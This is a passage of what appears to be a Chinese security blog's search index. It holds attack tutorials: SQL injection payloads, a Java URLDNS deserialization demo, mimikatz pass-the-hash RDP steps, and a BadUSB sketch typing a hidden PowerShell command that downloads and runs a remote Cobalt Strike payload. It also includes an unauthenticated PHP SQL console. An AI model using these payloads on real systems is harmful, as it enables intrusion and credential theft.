f.setAccessible(true);</span><br><span class=\"line\">        f.set(url,1);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 把URL对象加入的HashMap对象中，利用put方法</span><br><span class=\"line\">        hashmap.put(url,&quot;234&quot;);   // 此处的234为随机值，随便什么都可以，只是为了把URL对象传入进去，满足put方法的语法</span><br><span class=\"line\">        f.set(url,-1);  // 跳出if判断，执行hashCode方法</span><br><span class=\"line\"></span><br><span class=\"line\">        // 序列化：在序列化时，hashCode变量此时的值为-1；前面通过反射改成1，是避免HashMap类中的put方法调用到hashCode方法触发DNS请求</span><br><span class=\"line\">        SerializeDemo(hashmap);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 反序列化</span><br><span class=\"line\">         DeserializeDemo();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static void SerializeDemo(Object hashmap) throws IOException &#123;</span><br><span class=\"line\">        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class=\"line\">        outputStream.writeObject(hashmap);</span><br><span class=\"line\">        outputStream.close();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static void DeserializeDemo() throws IOException, ClassNotFoundException &#123;</span><br><span class=\"line\">        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;));</span><br><span class=\"line\">        Object hashmap = inputStream.readObject();</span><br><span class=\"line\">        System.out.println(hashmap);</span><br><span class=\"line\">        inputStream.close();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>先序列化，然后对序列化的ser.bin的文件进行反序列化，触发DNS请求</p>\n<p><img src=\"/../images/image-20240423230758531.png\" alt=\"image-20240423230758531\"></p>\n<p>注：</p>\n<ul>\n<li>DNS请求记录会在本地进行缓存，第二次反序列化时；如果没有收到请求的话，建议换一个域名或者清空DNS缓存。通过反射改变class对象的属性。</li>\n<li>Class.forName()：forName方法默认会进行类加载，如果指定该方法的第二个参数是false的话，就不会进行类加载，也就不会执行静态代码块。</li>\n</ul>\n","categories":["Java反序列化漏洞专题"],"tags":["HashMap","URLDNS"]},{"title":"SQL注入(从order by、insert、update、delete等方式注入)","url":"/2021/05/24/SQL%E6%B3%A8%E5%85%A5-%E4%BB%8Eorder-by%E3%80%81insert%E3%80%81update%E3%80%81delete%E7%AD%89%E6%96%B9%E5%BC%8F%E6%B3%A8%E5%85%A5/","content":"<h3 id=\"order-by注入\"><a href=\"#order-by注入\" class=\"headerlink\" title=\"order by注入\"></a>order by注入</h3><p>​\t\t在不知道列名的情况下可以通过列的的序号来指代相应的列，但是经过测试这里是无法进行运算的，如<strong>order&#x3D;3-1</strong>和<strong>order&#x3D;2</strong>是不一样的。但是支持函数调用，如下图：</p>\n<p><img src=\"/../images/image-20231016002830773.png\" alt=\"image-20231016002830773\"></p>\n<ul>\n<li>报错注入：当order by注入处能<strong>返回错误信息</strong>时，可以考虑使用报错注入。</li>\n</ul>\n<p><img src=\"/../images/image-20231016002656611.png\" alt=\"image-20231016002656611\"></p>\n<ul>\n<li>延迟注入</li>\n</ul>\n<p><img src=\"/../images/image-20231016002741525.png\" alt=\"image-20231016002741525\"></p>\n<p><strong>Order by可以根据多列排序，因此注入的语句不一定限制在order by的第一个参数，也可以通过逗号去对<em>新的列</em>进行注入。</strong></p>\n<h3 id=\"insert注入\"><a href=\"#insert注入\" class=\"headerlink\" title=\"insert注入\"></a>insert注入</h3><ul>\n<li><p>报错注入：<code>or updatexml(1,concat(0x7e,database()),0)</code></p>\n<p><img src=\"/../images/image-20231016003101391.png\" alt=\"image-20231016003101391\"></p>\n</li>\n<li><p>二次注入</p>\n</li>\n</ul>\n<p><img src=\"/../images/image-20231016003205704.png\" alt=\"image-20231016003205704\"></p>\n<ul>\n<li>查询当前数据库下的所有表</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">insert into user (username,password) values </span><br><span class=\"line\">(&#x27;xiaoming&#x27;,</span><br><span class=\"line\">(select group_concat(table_name) from information_schema.tables where table_schema=database())</span><br><span class=\"line\">);</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/../images/image-20231016003341441.png\" alt=\"image-20231016003341441\"></p>\n<p><strong>除了常规的单行记录插入，还可以尝试多行记录插入；通过第二列数据的插入还能爆出插入的字段数有多少个</strong></p>\n<h3 id=\"update注入\"><a href=\"#update注入\" class=\"headerlink\" title=\"update注入\"></a>update注入</h3><ul>\n<li>报错注入</li>\n</ul>\n<p><img src=\"/../images/image-20231016003541742.png\" alt=\"image-20231016003541742\"></p>\n<ul>\n<li><p>延迟注入</p>\n<p><img src=\"/../images/image-20231016003630190.png\" alt=\"image-20231016003630190\"></p>\n</li>\n</ul>\n<h3 id=\"delete注入\"><a href=\"#delete注入\" class=\"headerlink\" title=\"delete注入\"></a>delete注入</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">dalete from users where id=2 or updatexml(1,concat(0x7e,database()),0)</span><br><span class=\"line\">dalete from users where id=2 or sleep(3)</span><br></pre></td></tr></table></figure>\n\n<p><strong>谨慎使用，避免误删数据</strong></p>\n","categories":["SQL注入"],"tags":["MySQL","order by","insert","update","delete"]},{"title":"badusb制作","url":"/2023/10/01/badusb%E5%88%B6%E4%BD%9C/","content":"<h3 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h3><p>&ensp;&ensp;&ensp;&ensp;不同于老式的U盘病毒，它利用了USB协议中的一个漏洞，通过模拟键盘、鼠标、网卡等从而让目标电脑执行恶意代码，达到控住主机或者窃取敏感信息等目的。</p>\n<p>&ensp;&ensp;&ensp;&ensp;利用了HID界面和相关协议，在代码层级模拟键盘或者鼠标的操作，达到恶意传播病毒或者删除关键文件的目的。</p>\n<p>&ensp;&ensp;&ensp;&ensp;<strong>恶意代码存在于U盘的固件中，PC上的杀毒软件无法访问到U盘存放固件的区域，因此也就意味着杀毒软件和U盘格式化都无法防御BadUSB的攻击</strong>。</p>\n<p><strong>硬件设备（Digispark开发板）</strong></p>\n<p>&ensp;&ensp;&ensp;&ensp;基于ATTINY85微控制器的USB开发板，体积小且价钱便宜，功能方面则没有Arduino般强大。 代码与Arduino大同小异，更可贵的是<strong>使用Arduino IDE来开发</strong>。</p>\n<h3 id=\"攻击方式\"><a href=\"#攻击方式\" class=\"headerlink\" title=\"攻击方式\"></a>攻击方式</h3><ol>\n<li>物理入侵，简单点找一些未锁屏的办公电脑挨个插入。</li>\n<li>U盘钓鱼，通过伪装成一个普通移动U盘撒向目标范围内引起目标注意。</li>\n<li>摆渡攻击，通常是攻击局域网内部系统，当再次插入互联网设备中敏感信息被传输。</li>\n</ol>\n<h3 id=\"购买途径\"><a href=\"#购买途径\" class=\"headerlink\" title=\"购买途径\"></a>购买途径</h3><p>某宝上直接就能购买，我买的是Digispark开发板</p>\n<p><img src=\"/../images/image-20231001174746620.png\" alt=\"image-20231001174746620\"></p>\n<h3 id=\"制作badusb\"><a href=\"#制作badusb\" class=\"headerlink\" title=\"制作badusb\"></a>制作badusb</h3><p>&ensp;&ensp;&ensp;&ensp;下载Arduino IDE，安装驱动：<a href=\"https://github.com/digistump/DigistumpArduino/releases\">https://github.com/digistump/DigistumpArduino/releases</a> </p>\n<p> （因为我的板子是Digispark开发板，Arduino IDE默认不支持该板子，需要下载对应的驱动）</p>\n<p><img src=\"/../images/image-20231001174856995.png\" alt=\"image-20231001174856995\"></p>\n<p>选择64位，进行安装</p>\n<p><img src=\"/../images/image-20231001174912387.png\" alt=\"image-20231001174912387\"></p>\n<p>确保所有驱动都勾选上，进行安装；安装好后，重启电脑</p>\n<p><img src=\"/../images/image-20231001174932215.png\" alt=\"image-20231001174932215\"></p>\n<p>打开Arduino IDE，先配置代理，避免后续因为下载问题</p>\n<p><img src=\"/../images/image-20231001175024665.png\" alt=\"image-20231001175024665\"></p>\n<p>&ensp;&ensp;&ensp;&ensp;打开偏好设置，附加开发板管理器网址：<a href=\"http://digistump.com/package_digistump_index.json\">http://digistump.com/package_digistump_index.json</a> \t（因为Ardunio IDE默认没有Digispark开发板，需要手动添加）</p>\n<p><img src=\"/../images/image-20231001175050708.png\" alt=\"image-20231001175050708\"></p>\n<p>打开开发板管理器，选择安装 Digistump AVR Boards</p>\n<p><img src=\"/../images/image-20231001175110135.png\" alt=\"image-20231001175110135\"></p>\n<p>安装好后，就可以选择Digispark板子了</p>\n<p><img src=\"/../images/image-20231001175157105.png\" alt=\"image-20231001175157105\"></p>\n<p>选择example中的keyboard案例</p>\n<p><img src=\"/../images/image-20231001175217975.png\" alt=\"image-20231001175217975\"></p>\n<p>利用CS生成powershell脚本来上线，并把powershell脚本托管到服务器上</p>\n<p><img src=\"/../images/image-20231001175240333.png\" alt=\"image-20231001175240333\"></p>\n<p>需要烧制到板子上的代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include &quot;DigiKeyboard.h&quot;</span><br><span class=\"line\">#define KEY_ESC 41</span><br><span class=\"line\">#define KEY_BACKSPACE 42</span><br><span class=\"line\">#define KEY_TAB 43</span><br><span class=\"line\">#define KEY_PRT_SCR 70</span><br><span class=\"line\">#define KEY_DELETE 76</span><br><span class=\"line\"> </span><br><span class=\"line\">void setup() &#123;</span><br><span class=\"line\">  DigiKeyboard.delay(5000);</span><br><span class=\"line\">  DigiKeyboard.sendKeyStroke(0);</span><br><span class=\"line\">  DigiKeyboard.delay(3000);</span><br><span class=\"line\">  DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);</span><br><span class=\"line\">  DigiKeyboard.delay(1000);</span><br><span class=\"line\">  DigiKeyboard.print(F(&quot;powershell -WindowStyle Hidden -NoLogo -executionpolicy bypass IEX(New-Object Net.WebClient).DownloadString(&#x27;http://xx.xx.xx.xx/payload.ps1&#x27;);&quot;));</span><br><span class=\"line\">  DigiKeyboard.delay(500);</span><br><span class=\"line\">  DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class=\"line\">  DigiKeyboard.delay(750);</span><br><span class=\"line\">  DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void loop() &#123;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>修改payload脚本的地址即可，直接点击上传，提示需要60秒内插入板子</p>\n<p><img src=\"/../images/image-20231001175320214.png\" alt=\"image-20231001175320214\"></p>\n<p>插入板子，写入成功</p>\n<p><img src=\"/../images/image-20231001175339032.png\" alt=\"image-20231001175339032\"></p>\n<p>把badusd重新插入到电脑上，机器成功上线</p>\n<p><img src=\"/../images/image-20231001175352585.png\" alt=\"image-20231001175352585\"></p>\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h3><p>&ensp;&ensp;&ensp;&ensp;在 Arduino 开发环境中，使用开发板管理器可以轻松安装和管理各种硬件平台的支持，包括不同的微控制器和开发板。默认情况下，Arduino IDE 附带一些常见的开发板支持，但对于其他特定的开发板或微控制器，可能需要添加附加的开发板支持。</p>\n<h3 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h3><ul>\n<li>参考视频：<a href=\"https://www.bilibili.com/video/av18699066\">https://www.bilibili.com/video/av18699066</a></li>\n<li>驱动下载地址：<a href=\"https://github.com/digistump/DigistumpArduino/releases\">https://github.com/digistump/DigistumpArduino/releases</a></li>\n<li>Arduino IDE代码生成器：<a href=\"https://github.com/Catboy96/Automator\">https://github.com/Catboy96/Automator</a></li>\n</ul>\n","categories":["硬件安全"],"tags":["嵌入式","Ardunio IDE","badusb","Digispark","硬件安全"]},{"title":"openVPN简单搭建","url":"/2023/09/15/openVPN%E7%AE%80%E5%8D%95%E6%90%AD%E5%BB%BA/","content":"<h3 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h3><p>​\t在电脑生成一张虚拟网卡，可以 hook网络层的请求</p>\n<h3 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h3><p>服务端下载openVPN的安装脚本</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">curl -O https://raw.githubusercontent.com/openvpn-install/master/openvpn-install.sh</span><br><span class=\"line\">chmod +x openvpn-install.sh &amp;&amp; ./openvpn-install.sh</span><br></pre></td></tr></table></figure>\n\n<p>确认是否是当前VPS的IP地址</p>\n<p><img src=\"/../images/image-20230915021521613.png\" alt=\"image-20230915021521613\"></p>\n<p>自动检测是否支持IPv6，提示不支持</p>\n<p><img src=\"/../images/image-20230915021604336.png\" alt=\"image-20230915021604336\"></p>\n<p>直接默认端口，也可以自定义端口</p>\n<p><img src=\"/../images/image-20230915021649497.png\" alt=\"image-20230915021649497\"></p>\n<p>提示UDP更快，选择UDP</p>\n<p><img src=\"/../images/image-20230915021707904.png\" alt=\"image-20230915021707904\"></p>\n<p>DNS选择默认的，直接回车</p>\n<p><img src=\"/../images/image-20230915021726635.png\" alt=\"image-20230915021726635\"></p>\n<p>后续两个询问全是默认回车即可</p>\n<p><img src=\"/../images/image-20230915021744285.png\" alt=\"image-20230915021744285\"></p>\n<p>最后配置账号和密码，服务端需要重启才能生效，<code>用户名.ovpn</code>文件生成在root目录下</p>\n<p>Mac使用Tunnelblick导入配置ovpn文件，连接输入密码即可</p>\n<p><img src=\"/../images/image-20230915021905820.png\" alt=\"image-20230915021905820\"></p>\n","categories":["乱八七糟"],"tags":["openVPN","代理","梯子"]},{"title":"基于PHP简易版MySQL可视化脚本","url":"/2023/09/27/%E5%9F%BA%E4%BA%8EPHP%E5%AE%9E%E7%8E%B0%E7%AE%80%E6%98%93%E7%89%88%E7%9A%84MySQL%E5%8F%AF%E8%A7%86%E5%8C%96%E8%84%9A%E6%9C%AC/","content":"<h3 id=\"mysql-manager-php\"><a href=\"#mysql-manager-php\" class=\"headerlink\" title=\"mysql_manager.php\"></a>mysql_manager.php</h3><p>上传脚本到服务器即可</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\"> &lt;html&gt;</span><br><span class=\"line\"> &lt;head&gt;</span><br><span class=\"line\">     &lt;title&gt;执行MySQL语句&lt;/title&gt;</span><br><span class=\"line\"> &lt;/head&gt;</span><br><span class=\"line\"> &lt;body&gt;</span><br><span class=\"line\">     &lt;h1&gt;执行MySQL语句&lt;/h1&gt;</span><br><span class=\"line\">     &lt;form method=&quot;POST&quot; action=&quot;&quot;&gt;</span><br><span class=\"line\">         &lt;textarea name=&quot;sql_statement&quot; rows=&quot;5&quot; cols=&quot;50&quot; placeholder=&quot;请输入MySQL语句&quot;&gt;&lt;/textarea&gt;</span><br><span class=\"line\">         &lt;br&gt;</span><br><span class=\"line\">         &lt;input type=&quot;submit&quot; value=&quot;执行&quot;&gt;</span><br><span class=\"line\">     &lt;/form&gt;</span><br><span class=\"line\">     &lt;?php</span><br><span class=\"line\">     // 检查是否提交了表单</span><br><span class=\"line\">     if ($_SERVER[&#x27;REQUEST_METHOD&#x27;] === &#x27;POST&#x27;) &#123;</span><br><span class=\"line\">         // 获取用户输入的MySQL语句</span><br><span class=\"line\">         $sql_statement = $_POST[&#x27;sql_statement&#x27;];</span><br><span class=\"line\">         // 连接MySQL数据库</span><br><span class=\"line\">         $host = &#x27;localhost&#x27;;</span><br><span class=\"line\">         $username = &#x27;root&#x27;;</span><br><span class=\"line\">         $password = &#x27;123456&#x27;;</span><br><span class=\"line\">         $database = &#x27;mysql&#x27;;</span><br><span class=\"line\">         $connection = mysqli_connect($host, $username, $password, $database);</span><br><span class=\"line\">         // 执行MySQL查询</span><br><span class=\"line\">         $result = mysqli_query($connection, $sql_statement);</span><br><span class=\"line\">         // 检查查询结果</span><br><span class=\"line\">         if ($result) &#123;</span><br><span class=\"line\">             // 回显查询结果</span><br><span class=\"line\">             echo &#x27;&lt;h2&gt;查询结果：&lt;/h2&gt;&#x27;;</span><br><span class=\"line\">             while ($row = mysqli_fetch_assoc($result)) &#123;</span><br><span class=\"line\">                 echo &#x27;&lt;pre&gt;&#x27;;</span><br><span class=\"line\">                 print_r($row);</span><br><span class=\"line\">                 echo &#x27;&lt;/pre&gt;&#x27;;</span><br><span class=\"line\">             &#125;</span><br><span class=\"line\">         &#125; else &#123;</span><br><span class=\"line\">             // 显示错误消息</span><br><span class=\"line\">             echo &#x27;&lt;h2&gt;错误：&lt;/h2&gt;&#x27;;</span><br><span class=\"line\">             echo &#x27;&lt;p&gt;&#x27; . mysqli_error($connection) . &#x27;&lt;/p&gt;&#x27;;</span><br><span class=\"line\">         &#125;</span><br><span class=\"line\">         // 关闭数据库连接</span><br><span class=\"line\">         mysqli_close($connection);</span><br><span class=\"line\">     &#125;</span><br><span class=\"line\">     ?&gt;</span><br><span class=\"line\"> &lt;/body&gt;</span><br><span class=\"line\"> &lt;/html&gt;</span><br></pre></td></tr></table></figure>\n\n<p>使用时，修改如下参数</p>\n<p><img src=\"/../images/image-20231016005053345.png\" alt=\"image-20231016005053345\"></p>\n<p>使用案例</p>\n<p><img src=\"/../images/image-20231016005127255.png\" alt=\"image-20231016005127255\"></p>\n","categories":["PHP脚本"],"tags":["PHP","MySQL"]},{"title":"利用mimikatz使用NTLM凭证登录RDP","url":"/2023/08/30/%E5%88%A9%E7%94%A8mimikatz%E4%BD%BF%E7%94%A8NTLM%E5%87%AD%E8%AF%81%E7%99%BB%E5%BD%95RDP/","content":"<h3 id=\"hash登陆RDP远程桌面\"><a href=\"#hash登陆RDP远程桌面\" class=\"headerlink\" title=\"hash登陆RDP远程桌面\"></a>hash登陆RDP远程桌面</h3><p>第一步：开启Restricted Admin mode</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">REG ADD &quot;HKLM\\System\\CurrentControlSet\\Control\\Lsa&quot; /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f</span><br><span class=\"line\">REG query &quot;HKLM\\System\\CurrentControlSet\\Control\\Lsa&quot; | findstr &quot;DisableRestrictedAdmin&quot; // 查看是否已开启，0x0则表示开启</span><br></pre></td></tr></table></figure>\n\n<p>第二步：利用mimikatz使用NTLM凭证登录RDP </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">privilege::debug</span><br><span class=\"line\">sekurlsa::pth /user:administrator /domain:. /ntlm:3667d84470exxxxxxxxx0a5ad69458 &quot;/run:mstsc.exe /restrictedadmin&quot;</span><br><span class=\"line\">// 会弹出mstsc窗口，输入正确的IP地址即可连接</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n<h3 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h3><ul>\n<li><a href=\"https://xz.aliyun.com/t/8574\">https://xz.aliyun.com/t/8574</a></li>\n</ul>\n","categories":["乱八七糟"],"tags":["RDP","3389","mimikatz","NTLM"]},{"title":"基于python实现简易的文件服务器","url":"/2022/11/05/%E5%9F%BA%E4%BA%8Epython%E5%AE%9E%E7%8E%B0%E7%AE%80%E6%98%93%E7%9A%84%E6%96%87%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%99%A8/","content":"<h3 id=\"file-server端代码\"><a href=\"#file-server端代码\" class=\"headerlink\" title=\"file_server端代码\"></a>file_server端代码</h3><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;Extend Python&#x27;s built in HTTP server to save files</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">curl or wget can be used to send files with options similar to the following</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">  curl -X PUT --upload-file somefile.txt http://localhost:8000</span></span><br><span class=\"line\"><span class=\"string\">  wget -O- --method=PUT --body-file=somefile.txt http://localhost:8000/somefile.txt</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">__Note__: curl automatically appends the filename onto the end of the URL so</span></span><br><span class=\"line\"><span class=\"string\">the path can be omitted.</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    <span class=\"keyword\">import</span> http.server <span class=\"keyword\">as</span> server</span><br><span class=\"line\"><span class=\"keyword\">except</span> ImportError:</span><br><span class=\"line\">    <span class=\"comment\"># Handle Python 2.x</span></span><br><span class=\"line\">    <span class=\"keyword\">import</span> SimpleHTTPServer <span class=\"keyword\">as</span> server</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">HTTPRequestHandler</span>(server.SimpleHTTPRequestHandler):</span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;Extend SimpleHTTPRequestHandler to handle PUT requests&quot;&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">do_PUT</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"string\">&quot;&quot;&quot;Save a file following a HTTP PUT request&quot;&quot;&quot;</span></span><br><span class=\"line\">        filename = os.path.basename(self.path)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># Don&#x27;t overwrite files</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> os.path.exists(filename):</span><br><span class=\"line\">            self.send_response(<span class=\"number\">409</span>, <span class=\"string\">&#x27;Conflict&#x27;</span>)</span><br><span class=\"line\">            self.end_headers()</span><br><span class=\"line\">            reply_body = <span class=\"string\">&#x27;&quot;%s&quot; already exists\\n&#x27;</span> % filename</span><br><span class=\"line\">            self.wfile.write(reply_body.encode(<span class=\"string\">&#x27;utf-8&#x27;</span>))</span><br><span class=\"line\">            <span class=\"keyword\">return</span></span><br><span class=\"line\"></span><br><span class=\"line\">        file_length = <span class=\"built_in\">int</span>(self.headers[<span class=\"string\">&#x27;Content-Length&#x27;</span>])</span><br><span class=\"line\">        <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(filename, <span class=\"string\">&#x27;wb&#x27;</span>) <span class=\"keyword\">as</span> output_file:</span><br><span class=\"line\">            output_file.write(self.rfile.read(file_length))</span><br><span class=\"line\">        self.send_response(<span class=\"number\">201</span>, <span class=\"string\">&#x27;Created&#x27;</span>)</span><br><span class=\"line\">        self.end_headers()</span><br><span class=\"line\">        reply_body = <span class=\"string\">&#x27;Saved &quot;%s&quot;\\n&#x27;</span> % filename</span><br><span class=\"line\">        self.wfile.write(reply_body.encode(<span class=\"string\">&#x27;utf-8&#x27;</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    server.test(HandlerClass=HTTPRequestHandler)</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h3 id=\"启动服务\"><a href=\"#启动服务\" class=\"headerlink\" title=\"启动服务\"></a>启动服务</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">python file_server.py</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/../images/image-20230925020404923.png\" alt=\"image-20230925020404923\"></p>\n<h3 id=\"上传文件\"><a href=\"#上传文件\" class=\"headerlink\" title=\"上传文件\"></a>上传文件</h3><p>两种方式</p>\n<ul>\n<li><p>curl -X PUT –upload-file somefile.txt <a href=\"http://localhost:8000/\">http://localhost:8000</a> </p>\n</li>\n<li><p>wget -O- –method&#x3D;PUT –body-file&#x3D;somefile.txt <a href=\"http://localhost:8000/somefile.txt\">http://localhost:8000/somefile.txt</a></p>\n</li>\n</ul>\n<p><img src=\"/../images/image-20230925020720967.png\" alt=\"image-20230925020720967\"></p>\n<p>查看服务端，可以看到已经上传的文件</p>\n<p><img src=\"/../images/image-20230925020754030.png\" alt=\"image-20230925020754030\"></p>\n<p><code>1.log文件地址：http://xx.xx.xx.xx:8000/1.log</code></p>\n","categories":["python"],"tags":["文件服务器","python","文件存储"]},{"title":"浅学正则","url":"/2021/01/26/%E6%B5%85%E5%AD%A6%E6%AD%A3%E5%88%99/","content":"<h3 id=\"单字符匹配\"><a href=\"#单字符匹配\" class=\"headerlink\" title=\"单字符匹配\"></a>单字符匹配</h3><p>匹配某个字符串：match()只能够匹配一个对象</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 格式：match(表达式, 匹配对象)</span></span><br><span class=\"line\"><span class=\"comment\"># 返回结果是object,使用group方法打印输出</span></span><br><span class=\"line\">text = <span class=\"string\">&#x27;python&#x27;</span></span><br><span class=\"line\">result1 = re.<span class=\"keyword\">match</span>(<span class=\"string\">&#x27;py&#x27;</span>, text)</span><br><span class=\"line\">result2 = re.<span class=\"keyword\">match</span>(<span class=\"string\">&#x27;pt&#x27;</span>, text)</span><br><span class=\"line\">result3 = re.<span class=\"keyword\">match</span>(<span class=\"string\">&#x27;yt&#x27;</span>, text)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(result1.group())</span><br><span class=\"line\"><span class=\"built_in\">print</span>(result2.group())  <span class=\"comment\"># 匹配不到，会返回None</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(result3.group())  <span class=\"comment\"># 匹配不到，会返回None，match函数从起始位置开始匹配</span></span><br><span class=\"line\"><span class=\"comment\"># 如果有多个匹配，group(n)可以指定匹配第几个 </span></span><br></pre></td></tr></table></figure>\n\n<ol>\n<li><p>点(.)：匹配任意的某个字符(<code>无法匹配换行符</code>)</p>\n</li>\n<li><p>\\d：匹配任意的某个数字(<code>数字以外的内容均不匹配</code>)</p>\n</li>\n<li><p>\\D：除数字以外均可匹配(<code>\\D和\\d互补</code>)</p>\n</li>\n<li><p>\\s：匹配空白字符(<code>\\n、\\t、\\r、空格都表示空白字符</code>)</p>\n</li>\n<li><p>\\w：匹配小写的a-z，大写的A-Z，数字和下划线</p>\n</li>\n<li><p>\\W：匹配除小写\\w之外的所有字符(<code>\\w和\\W互补</code>)</p>\n</li>\n<li><p>[]：组合的方式，只要在中括号内的内容均可匹配(<code>多个匹配内容是，取&quot;或&quot;，只要匹配对象中含有一个内容就匹配</code>)</p>\n</li>\n</ol>\n<h3 id=\"多字符匹配\"><a href=\"#多字符匹配\" class=\"headerlink\" title=\"多字符匹配\"></a>多字符匹配</h3><ol>\n<li>星号(*)：匹配零个或多个字符</li>\n</ol>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">text1 = <span class=\"string\">&#x27;123456789&#x27;</span></span><br><span class=\"line\">result1 = re.<span class=\"keyword\">match</span>(<span class=\"string\">&#x27;[\\d]*&#x27;</span>, text)  </span><br><span class=\"line\"><span class=\"comment\"># 不加*号，只匹配“1”；加上后，能全部匹配</span></span><br><span class=\"line\"><span class=\"comment\"># 指得是：匹配[\\d]零次或多次</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(result1.group())  <span class=\"comment\"># 输出：123456789</span></span><br><span class=\"line\"></span><br><span class=\"line\">text2 = <span class=\"string\">&#x27;123-456-789&#x27;</span></span><br><span class=\"line\">result2 = re.<span class=\"keyword\">match</span>(<span class=\"string\">&#x27;[\\d]*&#x27;</span>, text)  </span><br><span class=\"line\"><span class=\"built_in\">print</span>(result2.group())  <span class=\"comment\"># 只匹配到：123</span></span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li><p>加号(+)：匹配一个或多个字符(<code>至少有一个</code>)</p>\n</li>\n<li><p>问号(?)：匹配零个或一个字符</p>\n</li>\n<li><p>{m}：匹配指定个数m个</p>\n</li>\n</ol>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">text = <span class=\"string\">&#x27;12345-6789&#x27;</span></span><br><span class=\"line\">result = re.<span class=\"keyword\">match</span>(<span class=\"string\">&#x27;[\\d]&#123;3&#125;&#125;&#x27;</span>, text)  </span><br><span class=\"line\"><span class=\"built_in\">print</span>(result.group())  <span class=\"comment\"># 匹配到：123</span></span><br></pre></td></tr></table></figure>\n\n<ol start=\"5\">\n<li>{m,n}：匹配m到n个字符(<code>默认匹配最多次（n次）</code>)</li>\n</ol>\n<hr>\n<h3 id=\"匹配规则的替代方案\"><a href=\"#匹配规则的替代方案\" class=\"headerlink\" title=\"匹配规则的替代方案\"></a>匹配规则的替代方案</h3><ol>\n<li><p>\\d —&gt; [0-9]</p>\n</li>\n<li><p>\\D —&gt; [^0-9] <code>中括号里面加^表示取反，在外面表示其后跟着的字符作为开头</code></p>\n</li>\n<li><p>\\w —&gt; [0-9a-zA-Z_]</p>\n</li>\n<li><p>\\W —&gt; [^0-9a-zA-Z_]</p>\n</li>\n<li><p>[\\d\\D]、[\\w\\W] —&gt; 匹配所有的字符</p>\n</li>\n</ol>\n<hr>\n<h3 id=\"特殊匹配\"><a href=\"#特殊匹配\" class=\"headerlink\" title=\"特殊匹配\"></a>特殊匹配</h3><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">result1 = re.<span class=\"keyword\">match</span>(<span class=\"string\">&#x27;[.]+&#x27;</span>, text)  <span class=\"comment\"># 仅仅匹配字符&quot;.&quot;，没有其他含义，也可以加转义来匹配：&quot;\\.&quot;</span></span><br><span 